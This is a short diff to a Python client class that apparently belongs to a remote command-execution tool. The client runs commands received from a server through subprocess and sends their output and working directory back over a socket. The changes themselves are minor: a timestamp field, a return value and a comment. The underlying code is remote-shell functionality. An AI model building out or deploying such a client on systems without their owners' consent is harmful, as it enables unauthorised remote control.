@@ -14,7 +14,7 @@ from pickle import loads, dumps
 from subprocess import getoutput
 from requests import get, packages
 from os import uname, chdir, getcwd
-from time import sleep
+from time import sleep, time
 #from packages.urllib3.exceptions import InsecureRequestWarning
 
 #packages.urllib3.disable_warnings(InsecureRequestWarning)
@@ -129,7 +129,7 @@ class Client(object):
         if self.allCommands().get(command.split()[0]):
             return self.allCommands()[command.split()[0]]['action'], ''.join(f'{cmd} ' for cmd in command.split()[1:]) # 1: function, 2: args #
 
-        return False
+        return False, ''
 
     # returns output of the command informed
     def outputCommand(self, command):
@@ -143,13 +143,13 @@ class Client(object):
             output = customOutput.encode()
 
         header = {
-            "time": datetime.now().strftime('%M %S').split(),
+            "initialTime": time(),
             "bytes": len(output),
             "currentDirectory": getcwd()
         }
         
         self.sendHeader(header)
-        sleep(0.5)
+        sleep(0.5) # small delay to send the data
         self.__Client.send(output)
 
     # checking and executing command informed by server side
